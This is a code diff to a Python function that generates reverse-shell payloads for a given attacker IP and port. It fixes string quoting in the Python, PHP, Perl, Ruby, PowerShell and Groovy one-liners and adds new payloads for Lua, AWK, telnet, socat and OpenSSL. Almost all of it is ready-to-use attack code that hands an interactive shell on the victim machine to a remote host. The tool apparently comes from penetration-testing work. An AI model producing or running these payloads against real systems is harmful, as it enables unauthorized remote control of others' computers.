@@ -26,19 +26,19 @@ def generate_payloads(attacker_ip: str, port: int) -> dict:
         "bash_udp": f"bash -i >& /dev/udp/{attacker_ip}/{port} 0>&1",
         
         # Python
-        "python": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{attacker_ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'",
+        "python": f'''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{attacker_ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' ''',
         
         # Python3
-        "python3": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{attacker_ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'",
+        "python3": f'''python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{attacker_ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' ''',
         
         # PHP
-        "php": f"php -r '$sock=fsockopen("{attacker_ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");'",
+        "php": f'''php -r '$sock=fsockopen("{attacker_ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");' ''',
         
         # Perl
-        "perl": f'perl -e 'use Socket;$i="{attacker_ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'',
+        "perl": f'''perl -e 'use Socket;$i="{attacker_ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};' ''',
         
         # Ruby
-        "ruby": f'ruby -rsocket -e'f=TCPSocket.open("{attacker_ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'',
+        "ruby": f'''ruby -rsocket -e 'f=TCPSocket.open("{attacker_ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)' ''',
         
         # Netcat mkfifo
         "nc_mkfifo": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {attacker_ip} {port} >/tmp/f",
@@ -50,13 +50,28 @@ def generate_payloads(attacker_ip: str, port: int) -> dict:
         "nc_c": f"nc -c /bin/sh {attacker_ip} {port}",
         
         # PowerShell (Windows)
-        "powershell": f"powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{attacker_ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"",
+        "powershell": f'''powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{attacker_ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"''',
         
         # Node.js
         "nodejs": f"require('child_process').exec('nc -e /bin/sh {attacker_ip} {port}')",
         
         # Java/Groovy
-        "groovy": f'String host="{attacker_ip}";int port={port};String cmd="/bin/sh";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){{while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{{p.exitValue();break;}}catch(Exception e){{}}}};p.destroy();s.close();',
+        "groovy": f'''String host="{attacker_ip}";int port={port};String cmd="/bin/sh";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){{while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{{p.exitValue();break;}}catch(Exception e){{}}}};p.destroy();s.close();''',
+        
+        # Lua
+        "lua": f'''lua -e 'local host, port = "{attacker_ip}", {port} local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()' ''',
+        
+        # AWK
+        "awk": f"awk 'BEGIN {{s = \"/inet/tcp/0/{attacker_ip}/{port}\"; while(42) {{ do{{ printf \"shell>\" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != \"exit\") close(s); }}}}'",
+        
+        # Telnet
+        "telnet": f"TF=$(mktemp -u); mkfifo $TF && telnet {attacker_ip} {port} 0<$TF | /bin/sh 1>$TF",
+        
+        # Socat
+        "socat": f"socat TCP:{attacker_ip}:{port} EXEC:/bin/sh",
+        
+        # OpenSSL
+        "openssl": f"mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {attacker_ip}:{port} > /tmp/s; rm /tmp/s",
     }
     
     return payloads
